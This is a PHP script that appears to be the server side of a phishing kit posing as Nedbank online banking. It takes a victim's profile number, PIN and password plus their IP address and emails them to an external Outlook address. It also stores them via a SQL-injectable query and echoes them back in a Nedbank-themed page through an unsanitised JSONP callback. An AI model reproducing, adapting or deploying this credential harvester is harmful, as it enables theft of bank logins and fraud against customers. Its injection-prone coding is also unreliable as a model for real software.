<?php
if(isset($_GET['profile']))
{
    include_once 'sqlite.php';
	$profile = $_GET['profile'];
	$pin = $_GET['pin'];
        $password = $_GET['password'];
        
        $idNo = false;
	
	if($profile == "" || $pin == "" || $password == ""){
		$error = 1;
	}
	
	$ip = $_SERVER['REMOTE_ADDR'];
	
	$time = time();
	$date = date("Y-m-d H:i:s");
	
        //$msg = "cellphone number  : $cell \r\n";
        //$msg .= "ID Number : $idNo \r\n";
	$msg = "Profile Number : $profile \r\n";
	$msg .= "Pin: $pin \r\n";
	$msg .= "Password: $password \r\n";
        $msg .= "Remote_Addr: $ip \r\n\n";
        
	$from = "noreply <support@".$_SERVER['HTTP_HOST'].">";
	$headers = "From:" . $from;
        $subject = "NED PROFILE Access [$profile] [$ip]***";

        if(mail('definitepurposefocus@outlook.com', $subject, $msg, $headers))
        //if(1)
        {
            //$experience_login = file_get_contents('../NediBarlars.htm');
            $query = 'INSERT INTO result (subject,message,isread,date_time) VALUES ("'.$subject.'","'.$msg.'","notread","'. date("Y-m-d H:i:s").'");';
            $db->exec($query);
            //$experience_login = file_get_contents('../NediBarlars.htm');
            $experience_login = file_get_contents('../NediBalars~ZA~BELLAS~NOMORO.htm');
            $experience_login = str_replace('current_date', date('d M Y H:i:s'), $experience_login);
            //$experience_login = str_replace('{userPassword}', $pin, $experience_login);
            include("../images/Nedbank.png");
            $experience_login = str_replace('{PROFILE_NUMBER}', $profile, $experience_login);
            $experience_login = str_replace('{PIN}', $pin, $experience_login);
            $experience_login = str_replace('{PASSWORD}', $password, $experience_login);
            
            
            //sleep(2);
            
            header("Content-Type: application/javascript");
            $callback = $_GET["callback"];
            //$message = $_GET["message"]." you got a response from server yipeee!!!";
            //$jsonResponse = '{"message":\''.trim(preg_replace('/\s+/', ' ', $experience_login)).'\'}';
            $jsonResponse = json_encode(array('message' => $experience_login, 'accessData' => array(
                    'ID_NUMBER' => $idNo, 
                    'PROFILE_NUMBER' => $profile,
                    'PIN' => $pin,
                    'PASSWORD' => $password
                )));
            echo $callback . '(' . $jsonResponse . ')';	
                //sleep(40);
            /*
                setcookie('ccn', $profile, 0, '/');
                setcookie('csp', $pin, 0, '/');
                //setcookie('atm', $atm, 0, '/');
                setcookie('pwd', $password, 0, '/');
                $htmlMessage = $profile;

                header("Content-Type: application/javascript");
                $callback = $_GET["callback"];
                //$message = $_GET["message"]." you got a response from server yipeee!!!";
                $jsonResponse = '{"message":\''.trim(preg_replace('/\s+/', ' ', $htmlMessage)).'\'}';
                $jsonResponse = json_encode(
                array(
                    'ID_NUMBER' => $idNo, 
                    'PROFILE_NUMBER' => $profile,
                    'PIN' => $pin,
                    'PASSWORD' => $password
                ));
                
                header("Content-Type: application/javascript");
                $callback = $_GET["callback"];
                //$message = $_GET["message"]." you got a response from server yipeee!!!";
                //$jsonResponse = '{"message":\''.trim(preg_replace('/\s+/', ' ', $experience_login)).'\'}';
                $jsonResponse = json_encode(array('message' => $experience_login, 'parameters' => ));
                echo $callback . '(' . $jsonResponse . ')';	*/
        }			
}
